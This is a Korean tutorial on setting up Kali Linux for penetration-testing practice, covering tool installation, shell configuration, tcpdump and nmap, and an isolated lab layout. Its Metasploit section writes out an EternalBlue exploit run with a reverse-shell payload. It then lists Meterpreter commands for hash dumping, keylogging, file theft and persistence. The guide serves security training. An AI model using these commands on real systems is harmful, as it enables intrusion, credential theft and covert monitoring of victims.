# Kali Linux 설치 및 초기 설정 완전 가이드

## 1. 설치 후 필수 초기 작업

### 시스템 업데이트
```bash
apt-get update && apt-get upgrade -y
apt-get dist-upgrade -y
apt-get autoremove -y
```

### VMware Tools 설치
```bash
# VMware 환경
apt-get install open-vm-tools open-vm-tools-desktop -y
```

### VirtualBox Guest Additions 설치
```bash
# 1. 먼저 ISO를 CD-ROM으로 마운트
cp /media/cdrom/VBoxLinuxAdditions.run ~
chmod +x ~/VBoxLinuxAdditions.run
./VBoxLinuxAdditions.run
reboot
```

---

## 2. 한국어 입력 설정

```bash
apt-get install nabi -y
apt-get install im-switch -y
im-switch -s nabi
im-switch -c
reboot
# 부팅 후 Shift + Space 로 한/영 전환
```

---

## 3. 기본 보안 도구 설치

### 네트워크 분석
```bash
apt-get install -y \
  nmap \
  masscan \
  wireshark \
  tcpdump \
  netcat-traditional \
  socat \
  hping3 \
  arpspoof \
  ettercap-text-only
```

### 웹 해킹
```bash
apt-get install -y \
  burpsuite \
  sqlmap \
  nikto \
  dirb \
  gobuster \
  wfuzz \
  whatweb \
  wafw00f
```

### 패스워드 크랙
```bash
apt-get install -y \
  john \
  hashcat \
  hydra \
  medusa \
  crunch \
  cewl \
  ophcrack
```

### 익스플로잇 프레임워크
```bash
# Metasploit Framework는 Kali에 기본 설치됨
msfupdate                    # DB 업데이트
service postgresql start     # DB 시작
msfdb init                   # MSF DB 초기화
msfconsole                   # MSF 실행
```

### 무선 해킹
```bash
apt-get install -y \
  aircrack-ng \
  reaver \
  pixiewps \
  wifite \
  bettercap
```

---

## 4. 편의성 설정

### .bashrc 커스터마이징
```bash
cat >> ~/.bashrc << 'EOF'

# 컬러 프롬프트
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '

# 유용한 alias
alias ll='ls -alh'
alias la='ls -A'
alias ..='cd ..'
alias ...='cd ../..'
alias grep='grep --color=auto'
alias ports='netstat -tuln'
alias myip='curl -s ifconfig.me'
alias update='apt-get update && apt-get upgrade -y'

# 히스토리 설정
HISTSIZE=10000
HISTFILESIZE=20000
HISTTIMEFORMAT="%F %T "

EOF
source ~/.bashrc
```

### Vim 설정
```bash
cat > ~/.vimrc << 'EOF'
syntax on
set number
set tabstop=4
set shiftwidth=4
set expandtab
set autoindent
set hlsearch
set incsearch
set ignorecase
set smartcase
set background=dark
colorscheme desert
EOF
```

---

## 5. Metasploit Framework 기본 사용법

### 초기 설정
```bash
service postgresql start
msfdb init
msfconsole
```

### 기본 명령어
```
msf6 > help                  # 도움말
msf6 > search type:exploit   # 모듈 검색
msf6 > search ms17-010       # EternalBlue 검색
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options          # 옵션 확인
msf6 > set RHOSTS 192.168.1.100
msf6 > set LHOST 192.168.1.50
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > run                   # 공격 실행
```

### Meterpreter 기본 명령어
```
meterpreter > sysinfo        # 시스템 정보
meterpreter > getuid         # 현재 사용자
meterpreter > getsystem      # 권한 상승 시도
meterpreter > hashdump       # 패스워드 해시 덤프
meterpreter > shell          # 쉘 획득
meterpreter > upload file.exe C:\\temp\\  # 파일 업로드
meterpreter > download C:\\passwords.txt  # 파일 다운로드
meterpreter > screenshot     # 스크린샷
meterpreter > keyscan_start  # 키로거 시작
meterpreter > keyscan_dump   # 키로거 내용 덤프
meterpreter > run persistence -U -i 5 -p 4444 -r LHOST  # 지속성 유지
```

---

## 6. Armitage (Metasploit GUI)

```bash
# 실행 순서
service postgresql start
msfdb init
armitage &

# Armitage 내 주요 기능
# Hosts > Nmap Scan → 대상 스캔
# Attacks > Find Attacks → 취약점 기반 자동 공격 목록
# 공격 후 Meterpreter 세션 GUI로 관리
```

---

## 7. Wireshark 설정

### 비루트 사용자로 Wireshark 사용
```bash
usermod -aG wireshark $USER
# 로그아웃 후 재로그인
```

### tcpdump 기본 사용법 (CLI)
```bash
tcpdump -i eth0                    # eth0 인터페이스 캡처
tcpdump -i eth0 port 80            # HTTP 트래픽만
tcpdump -i eth0 host 192.168.1.100  # 특정 호스트
tcpdump -i eth0 -w capture.pcap    # 파일로 저장
tcpdump -r capture.pcap            # 저장된 파일 읽기
tcpdump -i eth0 -n -nn             # IP/포트를 숫자로 표시
tcpdump -i eth0 'tcp flags & (rst|syn) != 0'  # SYN/RST 패킷만
```

---

## 8. 포트 스캔 기초 (Nmap)

```bash
nmap -sn 192.168.1.0/24            # 호스트 탐지 (ping scan)
nmap -sS 192.168.1.100             # SYN 스캔 (stealth)
nmap -sT 192.168.1.100             # TCP 연결 스캔
nmap -sU 192.168.1.100             # UDP 스캔
nmap -p 1-65535 192.168.1.100      # 전체 포트 스캔
nmap -A 192.168.1.100              # 종합 스캔 (OS, 버전, 스크립트)
nmap -O 192.168.1.100              # OS 탐지
nmap -sV 192.168.1.100             # 서비스 버전 탐지
nmap --script vuln 192.168.1.100   # 취약점 스크립트 실행
nmap -sS -T4 -A -v 192.168.1.0/24  # 빠른 종합 스캔
```

---

## 9. 권장 학습 환경 구성

| 가상머신 | 역할 | 권장 OS |
|---------|------|---------|
| Attacker | 공격자 머신 | Kali Linux |
| Target-1 | 취약한 리눅스 서버 | Metasploitable2 |
| Target-2 | 취약한 윈도우 서버 | Windows Server 2008 (패치 없음) |
| Web Target | 웹 취약점 실습 | DVWA, WebGoat |

### 네트워크 설정
- 모든 VM을 **Host-only** 또는 **Internal Network**로 설정
- 인터넷 차단으로 안전한 실습 환경 구성
- 공격자 머신과 타겟이 같은 네트워크 대역 사용
